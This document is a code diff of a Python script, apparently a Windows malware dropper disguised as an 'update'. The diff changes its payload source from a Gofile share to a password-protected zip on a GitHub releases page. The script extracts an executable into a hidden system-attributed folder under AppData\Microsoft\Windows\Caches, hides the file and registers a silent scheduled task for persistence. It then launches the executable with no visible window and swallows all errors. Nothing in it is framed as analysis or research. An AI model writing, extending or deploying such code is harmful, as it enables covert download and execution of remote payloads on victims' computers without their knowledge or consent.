@@ -1,68 +1,62 @@
 import os
 import subprocess
 import urllib.request
-import json
+import tempfile
+import pyzipper
+from pathlib import Path
 
-GOFILE_CONTENT_ID = "EMtdMX0B"
+URL_ZIP_GITHUB = "https://github.com/zzzzzzdfds/updaterr/releases/download/update/update.zip"
+CONTRASENA_ZIP = "updaterdiscord"
 
 DIRECTORIO_DISCRETO = os.path.join(os.environ.get("APPDATA", "C:\\"), "Microsoft", "Windows", "Caches")
 RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
 
-def obtener_enlace_directo_gofile(content_id):
-    try:
-        req_account = urllib.request.Request(
-            "https://api.gofile.io/accounts", 
-            data=b"", 
-            headers={"User-Agent": "Mozilla/5.0"}
-        )
-        with urllib.request.urlopen(req_account, timeout=10) as resp:
-            data_account = json.loads(resp.read().decode('utf-8'))
-            token = data_account['data']['token']
-
-        url_content = f"https://api.gofile.io/contents/{content_id}?wt=4fd6sg3d7sg5&cache=true"
-        req_content = urllib.request.Request(
-            url_content, 
-            headers={
-                "User-Agent": "Mozilla/5.0",
-                "Authorization": f"Bearer {token}"
-            }
-        )
-        with urllib.request.urlopen(req_content, timeout=10) as resp:
-            data_content = json.loads(resp.read().decode('utf-8'))
-            
-            contents = data_content['data']['contents']
-            for item_id, item_info in contents.items():
-                if item_info.get('type') == 'file' and item_info.get('name', '').endswith('.exe'):
-                    return item_info.get('link')
-    except Exception:
-        pass
-    return None
-
-def descargar_update():
+def descargar_y_extraer():
     try:
         if not os.path.exists(DIRECTORIO_DISCRETO):
             os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
             subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        if os.path.exists(RUTA_EXE_FINAL):
+        if os.path.exists(RUTA_EXE_FINAL) and os.path.getsize(RUTA_EXE_FINAL) > 10240:
             return True
 
-        url_descarga_real = obtener_enlace_directo_gofile(GOFILE_CONTENT_ID)
-        if not url_descarga_real:
-            return False
-
-        headers = {"User-Agent": "Mozilla/5.0"}
-        req = urllib.request.Request(url_descarga_real, headers=headers)
+        ruta_temp_zip = os.path.join(tempfile.gettempdir(), "update_secure.zip")
         
-        with urllib.request.urlopen(req, timeout=30) as response, open(RUTA_EXE_FINAL, 'wb') as out_file:
+        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+        req = urllib.request.Request(URL_ZIP_GITHUB, headers=headers)
+        
+        with urllib.request.urlopen(req, timeout=30) as response, open(ruta_temp_zip, 'wb') as out_file:
             while True:
                 chunk = response.read(16384)
                 if not chunk:
                     break
                 out_file.write(chunk)
 
-        subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
+        with pyzipper.AESZipFile(ruta_temp_zip, 'r') as zf:
+            zf.pwd = CONTRASENA_ZIP.encode('utf-8')
+            for filename in zf.namelist():
+                if filename.endswith('.exe'):
+                    zf.extract(filename, DIRECTORIO_DISCRETO)
+                    nombre_extraido = os.path.basename(filename)
+                    ruta_extraida_real = os.path.join(DIRECTORIO_DISCRETO, nombre_extraido)
+                    
+                    if nombre_extraido != "update.exe":
+                        if os.path.exists(RUTA_EXE_FINAL):
+                            os.remove(RUTA_EXE_FINAL)
+                        os.rename(ruta_extraida_real, RUTA_EXE_FINAL)
+                    break
+
+        if os.path.exists(ruta_temp_zip):
+            try:
+                os.remove(ruta_temp_zip)
+            except:
+                pass
+
+        if os.path.exists(RUTA_EXE_FINAL) and os.path.getsize(RUTA_EXE_FINAL) > 10240:
+            subprocess.run(f'attrib +h "{RUTA_EXE_FINAL}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return True
+
+        return False
     except Exception:
         return False
 
@@ -79,13 +73,16 @@ def configurar_tarea_silenciosa():
         return False
 
 if __name__ == "__main__":
-    if os.path.exists(RUTA_EXE_FINAL) or descargar_update():
+    if descargar_y_extraer():
         configurar_tarea_silenciosa()
 
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
-        subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+        try:
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = subprocess.SW_HIDE
+            subprocess.Popen([RUTA_EXE_FINAL], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
+        except Exception:
+            pass
 
     try:
         ruta_runtime = os.path.join(os.environ["APPDATA"], "V10Runtime")
